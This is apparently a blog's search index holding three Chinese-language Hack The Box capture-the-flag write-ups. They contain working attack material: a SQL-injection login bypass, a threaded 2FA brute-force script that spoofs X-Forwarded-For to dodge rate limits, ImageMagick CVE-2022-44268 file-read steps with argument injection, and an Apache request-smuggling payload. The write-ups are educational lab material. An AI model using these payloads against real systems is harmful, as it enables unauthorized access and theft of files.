<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HTB_No-Threshold</title>
    <link href="/2024/05/28/htb-WsTodo/"/>
    <url>/2024/05/28/htb-WsTodo/</url>
    
    <content type="html"><![CDATA[<h1 id="No-Threshold"><a href="#No-Threshold" class="headerlink" title="No-Threshold"></a>No-Threshold</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Prepare for the finest magic products out there. However, please be aware that we’ve implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.</p><p>为最好的魔法产品做好准备。但是，请注意，我们已经在我们的网络应用程序中实施了专门的保护咒语，以防止任何针对我们网上商店的黑魔法。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>下载题目源码进行分析，通过<code>dashboard.py</code>可知，当我们通过身份验证，便可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dash</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;private/dashboard.html&quot;</span>, flag=Config.FLAG)<br></code></pre></td></tr></table></figure><p>查看<code>login.py</code>若用户成功登录将被重定向到<code>/auth/verify-2fa</code>若未成功，则回到<code>public/login.html</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>但在页面点击<code>login</code>返回报错403，对其路径进行模糊测试，发现<code>//auth/login</code>可以成功绕过</p><p>尝试使用万能密码绕过登录验证，结果成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span>password<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/auth/verify-2fa</code> 页面，此处因为只有四位纯数字，于是尝试使用爆破，同时由于短时间内同一IP请求次数过多将被服务器阻止，这里通过修改<code>X-Forwarded-For</code>实现每五个请求更换一个IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent. futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_combinations_in_array</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read().splitlines()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_response</span>(<span class="hljs-params">response, combination</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Invalid 2FA Code!&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Try: <span class="hljs-subst">&#123;combination&#125;</span>\n&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;GOT IT!\n2FA Code: <span class="hljs-subst">&#123;combination&#125;</span>\n<span class="hljs-subst">&#123;response.text&#125;</span>\n&#x27;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">ip, combination, headers, url</span>):<br>    headers[<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>] = ip<br>    data = &#123;<span class="hljs-string">&#x27;2fa-code&#x27;</span>: <span class="hljs-built_in">str</span>(combination)&#125;<br><br>    response = requests.post(url, headers=headers, data=data)<br>    handle_response(response, combination)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_all_requests</span>(<span class="hljs-params">url, combinations_array</span>):<br>    base_ip = <span class="hljs-string">&#x27;192.168.&#x27;</span><br>    current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046/auth/verify-2fa&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;13&#x27;</span>,<br>        <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-comment"># Multi-threading requests sending (see python ThreadPoolExecutor lib for more informations)</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        futures = []<br><br>        <span class="hljs-keyword">for</span> i, combination <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(combinations_array, start=<span class="hljs-number">1</span>):<br>            ip = base_ip + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">1</span>])<br><br>            future = executor.submit(send_request, ip, combination, headers, url)<br>            futures.append(future)<br><br>            <span class="hljs-keyword">if</span> i % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span><br>                current_ip_suffix[<span class="hljs-number">0</span>] += <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> current_ip_suffix[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">254</span>:<br>                current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> futures:<br>                future.result()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    combinations_path = <span class="hljs-string">&#x27;4-digit-wordlist.txt&#x27;</span><br>    url =<span class="hljs-string">&#x27;http://83.136.249.173:34046/auth/verify-2fa&#x27;</span><br><br>    combinations_array = get_combinations_in_array(combinations_path)<br>    send_all_requests(url, combinations_array)<br></code></pre></td></tr></table></figure><p>Flag：HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>SQL注入</tag>
      
      <tag>暴力破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_PryingEyes</title>
    <link href="/2024/05/27/htb-PryingEyes/"/>
    <url>/2024/05/27/htb-PryingEyes/</url>
    
    <content type="html"><![CDATA[<h1 id="PryingEyes"><a href="#PryingEyes" class="headerlink" title="PryingEyes"></a>PryingEyes</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Welcome to the Prying Eyes, a “safe space” for those curious about the large organisations that dominate our life. How safe is the site really?</p><p>欢迎来到窥探之眼，这是一个“安全空间”，适合那些对主宰我们生活的大型组织感到好奇的人。该网站到底有多安全？</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网站，点击相关功能，发现可以进行注册，帖子内容没有什么特别的，于是下载源码进行审计</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js"># /routes/forum.<span class="hljs-property">js</span><br><span class="hljs-title class_">ValidationMiddleware</span>(<span class="hljs-string">&quot;post&quot;</span>, <span class="hljs-string">&quot;/forum&quot;</span>),<br>  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">const</span> &#123; title, message, parentId, ...convertParams &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">const</span> parentPost = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">getPost</span>(parentId);<br><br>      <span class="hljs-keyword">if</span> (!parentPost) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;That post doesn&#x27;t seem to exist.&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">let</span> attachedImage = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">files</span> &amp;&amp; req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>) &#123;<br>      <span class="hljs-keyword">const</span> fileName = <span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&quot;hex&quot;</span>);<br>      <span class="hljs-keyword">const</span> filePath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;uploads&quot;</span>, fileName);<br><br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br><br>        <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(filePath, processedImage);<br><br>        attachedImage = <span class="hljs-string">`/uploads/<span class="hljs-subst">$&#123;fileName&#125;</span>`</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        req.<span class="hljs-title function_">flashError</span>(<span class="hljs-string">&quot;There was an issue processing your image, please try again.&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Error occured while processing image:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/forum&quot;</span>);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">lastID</span>: postId &#125; = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">createPost</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">userId</span>, parentId, title, message, attachedImage);<br><br>    <span class="hljs-keyword">if</span> (parentId) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;parentId&#125;</span>#post-<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/forum/post/<span class="hljs-subst">$&#123;postId&#125;</span>`</span>);<br>    &#125;<br>  &#125;<br>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">database</span>) =&gt;</span> &#123;<br>  db = database;<br>  <span class="hljs-keyword">return</span> router;<br>&#125;;<br></code></pre></td></tr></table></figure><p> 在<code>forum.js</code>代码中可见，除了<code>title</code>、<code>message</code>、<code>parentld</code>这三个参数以外，其他参数都写在<code>convertParams</code>中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> convert<br></code></pre></td></tr></table></figure><p>使用了<code>convert</code>对图片进行了一个转换，而这个convert存在于<a href="https://www.npmjs.com/package/imagemagick-convert"><code>imagemagick-convert</code></a></p><p>而<code>imagemagick</code>存在的漏洞：<strong>CVE-2022-44268任意文件读取漏洞</strong></p><p>CVE-2022-44268：ImageMagick 7.1.0-49 存在信息泄露漏洞。当它解析 PNG 图像（例如，调整大小）时，生成的图像可能嵌入任意远程文件的内容（如果 ImageMagick 二进制文件有读取权限）</p><p>然后这个漏洞只有在转PNG文件时才会存在，但从代码中可知输出的图片类型为AVIF</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>        <span class="hljs-keyword">const</span> processedImage = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convert</span>(&#123;<br>          ...convertParams,<br>          <span class="hljs-attr">srcData</span>: req.<span class="hljs-property">files</span>.<span class="hljs-property">image</span>.<span class="hljs-property">data</span>,<br>          <span class="hljs-attr">format</span>: <span class="hljs-string">&quot;AVIF&quot;</span>,<br>        &#125;);<br></code></pre></td></tr></table></figure><p>这里采用imagemagick-convert的参数注入，上传过程中抓包修改其中参数内容，将<code>-write filename</code>写入其中并上传，从而成功利用</p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>利用<a href="https://github.com/vulhub/vulhub/blob/master/imagemagick/CVE-2022-44268/poc.py">github开源的poc</a>构造恶意图片，命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure></li><li><p>在评论出选择生成的poc.png进行上传，上传过程中手动抓包添加：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran">Conten-Disposition: <span class="hljs-keyword">form</span>-<span class="hljs-keyword">data</span>; <span class="hljs-keyword">name</span>=<span class="hljs-string">&quot;background&quot;</span><br><br>blue -<span class="hljs-built_in">write</span> ./uploads/<span class="hljs-built_in">exp</span>.png<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_3.png" alt="htb_pryingeyes_3"></p></li><li><p>访问&#x2F;uploads&#x2F;exp.png并下载写入的图片</p></li><li><p>将其后缀修改为.png使用之前github下载的poc读取带出来的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python CVE-2022-44268-poc.py generate -o poc.png -r flag.txt<br></code></pre></td></tr></table></figure><p><img src="/img/htb_pryingeyes_2.png" alt="htb_pryingeyes_2"></p></li><li><p>将得到内容HEX转ASCII，成功得到flag</p><p><img src="/img/htb_pryingeyes_1.png" alt="htb_pryingeyes_1"></p></li></ol><p>Flag：HTB{Im4g3m4g1ck_vU1n5_5tR1k3_4g4in}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>CVE</tag>
      
      <tag>任意文件读取</tag>
      
      <tag>参数注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_ApacheBlaze</title>
    <link href="/2024/05/27/htb-apacheblaze/"/>
    <url>/2024/05/27/htb-apacheblaze/</url>
    
    <content type="html"><![CDATA[<h1 id="ApacheBlaze"><a href="#ApacheBlaze" class="headerlink" title="ApacheBlaze"></a>ApacheBlaze</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you’ll need to crack a puzzle.</p><p>走进 ApacheBlaze 宇宙，这是一个充满街机点击游戏的世界。有传言说，通过玩某些游戏，您有机会赢得大奖。然而，在享受乐趣之前，您需要破解一个谜题。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>打开题目网址，可以看到有4个Game，但点击Game1~Game3都只会提示：</p><p><em><strong>This game is currently unavailable due to internal maintenance.</strong></em></p><p>而点击Game4则会提示</p><p><strong>This game is currently available only from dev.apacheblaze.local.</strong></p><p>此处猜测题目的考点可能在请求伪造</p><p>下载题目源码进行分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># backend/src/app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>] = &#123;<span class="hljs-string">&#x27;magic_click&#x27;</span>, <span class="hljs-string">&#x27;click_mania&#x27;</span>, <span class="hljs-string">&#x27;hyper_clicker&#x27;</span>, <span class="hljs-string">&#x27;click_topia&#x27;</span>&#125;<br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = <span class="hljs-string">&#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    game = request.args.get(<span class="hljs-string">&#x27;game&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> game:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Empty game name is not supported!.&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;GAMES&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Invalid game name!&#x27;</span><br>        &#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">elif</span> game == <span class="hljs-string">&#x27;click_topia&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-Host&#x27;</span>) == <span class="hljs-string">&#x27;dev.apacheblaze.local&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;app.config[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;</span>&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently available only from dev.apacheblaze.local.&#x27;</span><br>            &#125;), <span class="hljs-number">200</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;This game is currently unavailable due to internal maintenance.&#x27;</span><br>        &#125;), <span class="hljs-number">200</span><br><br></code></pre></td></tr></table></figure><p>从此代码不难看出，通过选择<code>Game4</code>并提供固定的<code>X-Forwarded-Host</code>即可得到flag</p><p>但经过抓包修改测试，这样并不能得到flag</p><p>而原因是<code>X-Forwarded-Host</code>不仅存在<code>dev.apacheblaze.local</code>还存在有其他的元素</p><p>通过Apache的文档，我们可以知道这种情况的原因：</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tp">当以反向代理模式运行时（例如，使用 ProxyPass 指令），mod_proxy_http 会添加多个请求标头，以便将信息传递到原始服务器。这些标头是：<br><br><span class="hljs-keyword">X</span>-Forwarded-For<br>    客户端的 IP 地址。<br><span class="hljs-keyword">X</span>-Forwarded-Host<br>    客户端在 Host HTTP 请求标头中请求的原始主机。<br><span class="hljs-keyword">X</span>-Forwarded-Server<br>    代理服务器的主机名。<br></code></pre></td></tr></table></figure><p>因此，我们需要考虑如何仅在<code>X-Forwarded-Host</code>设置一个正确的元素</p><p>这里利用漏洞：<strong>HTTP 请求走私攻击 (CVE-2023–25690)</strong></p><p>通过此漏洞，我们可以在发送给目标服务器的第一个请求中去隐藏第二个请求，而这样可以使得我们的第二个请求直接从反向代理发送，因此不会添加其他内容在<code>X-Forwarded-Host</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>综上所述，尝试构造Payload：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">/api/games/click_topia<span class="hljs-meta">%</span><span class="hljs-number">20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>aHost:<span class="hljs-meta">%</span><span class="hljs-number">20</span>dev.apacheblaze.local<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br></code></pre></td></tr></table></figure><p><img src="/img/HTB_ApacheBlaze_1.png"></p><p>Flag：HTB{1t5_4ll_4b0ut_Th3_Cl1ck5}</p>]]></content>
    
    
    <categories>
      
      <category>HackThebox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
      <tag>请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
